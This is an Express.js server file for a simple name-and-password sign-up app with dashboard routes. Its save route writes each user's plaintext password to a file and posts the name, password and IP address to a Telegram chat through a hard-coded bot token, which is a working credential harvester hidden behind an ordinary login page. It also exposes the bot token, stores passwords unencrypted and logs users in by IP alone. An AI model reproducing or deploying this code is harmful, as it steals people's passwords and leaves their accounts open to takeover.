import express from "express";
import bodyParser from "body-parser";
import fs from "fs";
import path from "path";
import requestIp from "request-ip";
import axios from "axios";

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = '7981577790:AAHhoGXjXGj2UCRKsSHWKXkAWH-HlKhiNk8';
const TELEGRAM_CHAT_ID = '5901409601';
const DATA_FILE = path.join(__dirname, "users.json");

app.set("view engine", "ejs");
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(requestIp.mw());

// **User Data Load Function**
const loadUsers = () => {
    if (!fs.existsSync(DATA_FILE)) return {};
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
};

// **Save User Data Function**
const saveUsers = (data) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
};

// **Homepage - Login Check**
app.get("/", (req, res) => {
    const users = loadUsers();
    const userIP = req.clientIp;

    if (users[userIP]) {
        // Agar IP already exist hai to direct login karega
        return res.redirect("/dashboard");
    }

    res.render("name");
});

// **Save User Data and Send to Telegram**
app.post("/save-name", async (req, res) => {
    const { userName, password } = req.body;
    const userIP = req.clientIp;
    const users = loadUsers();

    users[userIP] = { userName, password };
    saveUsers(users);

    // Send user info to Telegram bot
    const message = `New User Registered:
👤 Name: ${userName}
🔑 Password: ${password}
🌍 IP: ${userIP}`;
    
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    });

    res.redirect("/dashboard");
});

// **Forget Password - Delete Old Data**
app.post("/forget", (req, res) => {
    const userIP = req.clientIp;
    const users = loadUsers();

    if (users[userIP]) {
        delete users[userIP];
        saveUsers(users);
    }

    res.redirect("/");
});

// **Dashboard - Logged In Users**
app.get("/dashboard", (req, res) => {
    const users = loadUsers();
    const userIP = req.clientIp;

    if (!users[userIP]) {
        return res.redirect("/");
    }

    res.render("dashboard", { userName: users[userIP].userName });
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
